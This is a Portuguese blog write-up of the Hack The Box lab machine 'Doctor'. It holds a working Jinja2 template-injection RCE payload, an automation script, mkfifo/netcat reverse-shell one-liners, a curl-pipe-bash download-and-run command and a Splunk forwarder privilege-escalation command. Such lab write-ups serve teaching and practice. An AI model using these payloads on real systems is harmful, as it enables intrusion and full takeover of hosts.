---
layout: single
title: "Hackthebox write-up: Doctor"
namespace: htb-doctor
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-02-06 12:00:00
header:
   teaser: https://i.imgur.com/EeJREQG.png
---
Olá pessoal!

Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será **Doctor**, uma máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu) criada por [egotisticalSW](https://app.hackthebox.eu/users/94858).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box serão postados assim que as máquinas sejam aposentadas, então segue abaixo a primeira :smiley:!
{: .notice--info}

![image-20210209083728228](https://i.imgur.com/7DBDPWU.png){: .align-center}

## Enumeração

Então vamos começar com uma enumeração rápida utilizando o `nmap`. Executando um quick scan obtive o seguinte resultado, onde foi possível notar dois serviços HTTP, além de uma porta de SSH aberta:

```bash
nmap -sC -sV -Pn -oA quick 10.10.10.209
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03
Nmap scan report for 10.10.10.209
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds
                                                                          
```

### 80 TCP - Serviço HTTP

Antes de começar a enumeração, navegando no website utilizando o browser, notei de que se trata de um site institucional, que menciona um endereço de e-mail **info@doctors.htb**, onde o domínio `doctors.htb` deve se tratar do FQDN desta máquina.

![image-20210114195257224](https://i.imgur.com/cRUWuPh.png){: .align-center}

Para garantir que a enumeração dos serviços HTTP seja feita corretamente, caso algum deles esteja sendo publicado por este DNS, alterei o arquivo hosts local para refletir o nome correto para o endereço IP da máquina, podendo assim iniciar o processo de enumeração dos serviços.

```bash
$ sudo -i
# echo " " >> /etc/hosts
# echo "# HTB Doctors" >> /etc/hosts
# echo "10.10.10.209 doctors.htb" >> /etc/hosts
# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
 
# HTB Doctors
10.10.10.209 doctors.htb
```

Após alterar a entrada, uma vez acessando novamente a porta 80/TPC, desta vez via hostname, uma página diferente é exibida, conforme podemos ver abaixo:

![image-20210114210614527](https://i.imgur.com/bnqIzON.png){: .align-center}

Agora que confirmamos que a máquina possui um outro serviço publicado usando o dns, vamos começar enumerando os dois websites, tanto com DNS quanto IP, para que possamos buscar por alguma oportunidade interessante para um acesso inicial.

#### Whatweb

Verificando o output do `whatweb` de ambos os scans, podemos notar que os dois websites são publicados utilizando diferentes webservers, conforme abaixo:

- Via IP address: `Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]`
- Via DNS: `HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]`

#### Enumerando o website manualmente

Enquanto validando o website notei que na página de login havia também a possibilidade de resetar uma senha ou criar uma conta. A informação de endereço de e-mail que temos (info@doctors.htb) foi a primeira a ser testada mas os erros recebidos indicaram que a conta não existia.

Após algumas tentativas, tentando manipular os requests de alteração de senha, decidi por mudar de estratégia e tentar criar uma conta.

![image-20210115110541005](https://i.imgur.com/fSXdu3M.png){: .align-center}

Depois de criá-la com sucesso, uma mensagem de aviso foi exibida conforme abaixo, o que significa que **teremos apenas 20 minutos para utilizar a conta no site**.

![image-20210130194324306](https://i.imgur.com/R7dtMR4.png){: .align-center}

Depois de criada, iniciada a enumeração pelo código fonte da página, onde encontrei um diretorio `/archive` comentado no código, mas nada foi exibido quando acessei a página pela primeira vez.

```html
 <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

Avaliando as demais possibilidades parti para a criação de uma nova mensagem, uma das opções disponíveis, onde inseri o seguinte conteúdo para testes:

![image-20210115111008460](https://i.imgur.com/JT3MZfR.png){: .align-center}

Acessando a mensagem postada na sequência, notei que é direcionado para a URL `http://doctors.htb/post/2` mas também não consegui identificar nenhuma outra oportunidade de exploração neste ponto, apenas as opções padrão para alterar ou deletar a mensagem.

Manipulando a url, consegui acessar outros posts, como por exemplo `http://doctors.htb/post/1` que se tratava de uma mensagem do usuário `admin` mas que não possuia nenhuma informação relevante.

As coisas ficaram interessantes quando decidi acessar novamente o `/archive`, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via *Server-Side Template Injection (SSTI)*.

Para confirmar a possibilidade, seguindo o que encontrei em [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify), troquei o conteúdo do título da minha mensagem anterior para testar alguns tipos de injeção sugeridos, que nos permitirá identificar qual a engine utilizada e, posteriormente, criar o conteúdo malicioso para obter um acesso inicial.

![image-20210115111707069](https://i.imgur.com/vVVwKY2.png){: .align-center}

Esta injeção funcionou com sucesso, indicando que temos um website construido com Twig ou Jinja2 :smile: (o que faz sentido, já que o webservice é publicado utilizando **Werkzeug**, conforme pudemos notar via whatweb, que é um servidor web muito popular utilizado normalmente em conjunto com Flask ou Django).

![image-20210115111818436](https://i.imgur.com/EH0zQHN.png){: .align-center}

Depois de alguns testes, brincando com exemplos disponíveis em [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), consegui confirmar que a engine utilizada é **Jinja2**, onde o conteúdo abaixo funcionou sem problemas, dentre outros:

```python
{% raw %}{{config.items()}}{% endraw %}
```

## Acesso inicial

Após confirmado que um payload para Jinja2 deveria ser utilizado, foi possível obter um shell reverso na máquina através do seguinte processo:

- Em uma pasta na máquina do atacante, criei um arquivo de payload contendo a string que, uma vez executada, nos retornaria um shell reverso na porta 4443;

  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
  ```
  
- Este arquivo foi publicado a partir de um server HTTP simples utilizando python3, conforme execução do comando abaixo a partir do diretório onde o arquivo criado está localizado;

  ```bash
    sudo python3 -m http.server 80
  ```
  
- No portal, criei um novo post inserindo no lugar da string `title`, o conteúdo obtido no link acima citado do PayloadsAllTheThings. Este especificamente é bem interessante, pois nos permite executar comandos de forma dinâmica a partir do conteúdo recebido da variável **input** em um request do tipo GET, evitando assim modificar frequentemente o conteúdo da injeção:

  ```python
  {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
  ```
  
- Iniciei um listener usando netcat para ouvir na porta configurada no payload usando o comando abaixo;

  ```bash
  nc -lnvp 4443
  ```

- E depois fiz um request no portal, passando o comando que gostaria de ser executado na query string com o comando no input que gostaria que fosse executado.

  ```bash
  http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash
  ```

- E voilá! Recebi um shell reverso :smiley:

![image-20210117191626475](https://i.imgur.com/TyHFL9D.png){: .align-center}

**Bônus**: Pra facilitar na reobtenção deste acesso inicial, uma vez que a conta criada tem a validade curta de 20 min, criei um script simples em python para esta tarefa :smiley:.​ Para usá-lo basta configurar o listener e o webserver, da mesma forma que faríamos no método 100% manual, com a diferença de que o script irá recriar o usuário, configurar o payload malicioso na mensagem e fazer o request retornando o shell reverso novamente.
{: .notice--info}

```python
#!/usr/bin/python3

import requests

url = 'http://doctors.htb'
username = 'dummy'
password = 'P@ssw0rd'
ip = '10.10.10.10'
email = username+'@doctors.htb'

# Create new session
s = requests.session()

# Make initial request to get required cookies
r = s.get(url)

# Create user
payload = {'username':username,'email':email,'password':password,'confirm_password':password,'submit':'Sign Up'}
r = s.post(url+'/register',data=payload)

# Login
payload = {'email':email,'password':password,'submit':'Login'}
r = s.post(url+'/login?next=%2Fhome',data=payload)

# Create message
{% raw %}
title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
{% endraw %}
payload = {'title':title,'content':'content','submit':'Post'}
r = s.post(url+'/post/new',data=payload)

# Get Reverse shell
command = requests.utils.quote('curl -L http://'+ip+'/payload | bash')
r = s.get(url+'/archive?input='+command)
```

## User flag

Depois de obter o shell reverso, [fiz o upgrade dele para ter acesso a funcionalidades de auto-complete, etc](https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html), e iniciei o processo de enumeração:

- Os usuários existentes na máquina, com base nas home folders existentes são **shaun** e **web**;

- Verificando os grupos dos quais o usuário **web** é membro, notei que a conta é membro do grupo **adm**:

  ```bash
  web@doctor:/home$ id
  uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
  ```

  - O grupo **adm** no Linux permite acesso a arquivos localizados no diretório `/var/log`, que possivelmente pode permitir que consigamos alguma informação sensivel dentro das logs de componentes do sistema como webservers e tarefas agendadas (cron).

### Analizando as logs em /var/log

Então para iniciar esta análise vamos buscar quais componentes, alem dos defaults de sistema, temos dentro desta máquina:

```bash
web@doctor:/var/log$ ls -ld */
drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/
drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/
drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/
drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/
drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/
drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/
drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/
drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/
drwx------  2 root              root            4096 Apr 23  2020 private/
drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/
drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/
```

Iniciando com os logs do Apache2, como este é um dos serviços previamente enumerados e, considerando a data de criação desta máquina (assim podemos ignorar as informações mais recentes nela, que podem ser fruto de atividades de outros usuários), encontrei um arquivo interessante chamado **backup** que não é padrão do serviço:

```bash
web@doctor:/var/log/apache2$ ls -la | grep -v 'Jan 3'
total 7980
-rw-r-----  1 root adm       1266 Sep  5 11:58 access.log.10.gz
-rw-r-----  1 root adm        323 Aug 21 13:00 access.log.11.gz
-rw-r-----  1 root adm        270 Aug 18 12:48 access.log.12.gz
-rw-r--r--  1 root root   2194472 Jul 27  2020 access.log.13.gz
-rw-r-----  1 root adm        668 Sep 28 15:02 access.log.2.gz
-rw-r-----  1 root adm       1493 Sep 23 15:20 access.log.3.gz
-rw-r-----  1 root adm       3951 Sep 22 12:58 access.log.4.gz
-rw-r-----  1 root adm       1341 Sep 19 19:17 access.log.5.gz
-rw-r-----  1 root adm     664054 Sep 15 14:27 access.log.6.gz
-rw-r-----  1 root adm        384 Sep 14 10:07 access.log.7.gz
-rw-r-----  1 root adm       3018 Sep  7 17:24 access.log.8.gz
-rw-r-----  1 root adm       1338 Sep  6 22:46 access.log.9.gz
-rw-r-----  1 root adm      21578 Sep 17 16:23 backup
-rw-r-----  1 root adm        460 Sep 15 00:00 error.log.10.gz
-rw-r-----  1 root adm        476 Sep  7 17:46 error.log.11.gz
-rw-r-----  1 root adm        537 Sep  6 22:47 error.log.12.gz
-rw-r-----  1 root adm        680 Sep  5 11:58 error.log.13.gz
-rw-r-----  1 root adm        341 Sep  5 00:00 error.log.14.gz
-rw-r-----  1 root adm        789 Sep 28 15:07 error.log.2.gz
-rw-r-----  1 root adm       1092 Sep 23 15:42 error.log.3.gz
-rw-r-----  1 root adm        846 Sep 22 13:03 error.log.4.gz
-rw-r-----  1 root adm        655 Sep 22 10:40 error.log.5.gz
-rw-r-----  1 root adm        352 Sep 19 00:00 error.log.6.gz
-rw-r-----  1 root adm        424 Sep 18 00:00 error.log.7.gz
-rw-r-----  1 root adm        428 Sep 17 00:00 error.log.8.gz
-rw-r-----  1 root adm        629 Sep 16 00:00 error.log.9.gz
-rw-r--r--  1 root root         0 Jul 27  2020 other_vhosts_access.log
```

Verificando seu conteúdo, buscando pelas query strings únicas logadas nos requests, encontramos uma entrada interessante que traz um valor que possivelmente poderia ser utilizado como senha: **Guitar123**

```bash
web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
/
12.1.2\n"
400
/evox/about
/favicon.ico
/.git/HEAD
/HNAP1
/home
/icons/ubuntu-logo.png
/login
/nmaplowercheck1599231606
/nmaplowercheck1599231646
/post/new
/register
/reset_password?email=Guitar123"
/robots.txt
/sdk
/static/main.css
/static/profile_pics/default.gif
```

Como o outro usuário desta máquina é o **shaun**, tentando utilizar o usuário e senha que temos até o momento, tive sucesso ao logar com a conta mencionada, o que permitiu obter a flag contida em `/home/shaun/user.txt`:

```bash
web@doctor:~$ su shaun
Password:

shaun@doctor:~$ ls -la
total 44
drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 .
drwxr-xr-x 4 root  root  4096 Sep 19 16:54 ..
lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 shaun shaun  220 Sep  6 16:26 .bash_logout
-rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 .bashrc
drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache
drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config
drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg
drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
-rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile
-rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor
-r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt
shaun@doctor:~$ cat user.txt 
<redacted>
```

## Root flag

Agora logado como shaun, notei que ele não possui nenhum privilégio especial na maquina, além de não ter direitos de executar quaisquer comandos como root a partir do `sudo`:

```bash
shaun@doctor:/tmp$ sudo -l
[sudo] password for shaun: 
Sorry, user shaun may not run sudo on d
```

Após executar o script `linpeas.sh` do [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), verificando os serviços em execução, o mais provável meio de obter um acesso root seria a partir do serviço **splunkd**, que está em execução com a conta de sistema e está publicado na porta TCP 8089, conforme listado no scan de reconhecimento inicial.

Acessando este serviço manualmente, ao clicar no link **services**, conforme listado abaixo, uma janela de autenticação é exibida. Como a única credencial que possuímos é a do usuário shaun foi a primeira a ser tentada, onde tive sucesso :smiley:.

![image-20210131080459535](https://i.imgur.com/R4VNKDe.png){: .align-center}

![image-20210131080540525](https://i.imgur.com/lsTJ2cg.png){: .align-center}

Uma vez que temos credenciais para logon no serviço do Splunk, o próximo passo é encontrar uma forma de obter execução remota de código através do mesmo. Após alguma pesquisa, encontrei este link [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) que menciona um script disponível em [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2), que permitirá exatamente o que estávamos procurando.

Após executar o comando conforme abaixo, foi possível obter um shell reverso rodando sob o contexto de root:

```bash
$ python3 ./PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f" --lhost 10.10.10.10
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpcae79s9x.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.10.10:8181/
10.10.10.209 - - [04/Feb/2021 19:46:38] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!
```

A partir deste shell, a obtenção da flag em `/root/root.txt` pode ocorrer sem problemas.

```bash
# cat /root/root.txt
<redacted>
```

Espero que tenha sido útil!

Até o próximo post! :smile:
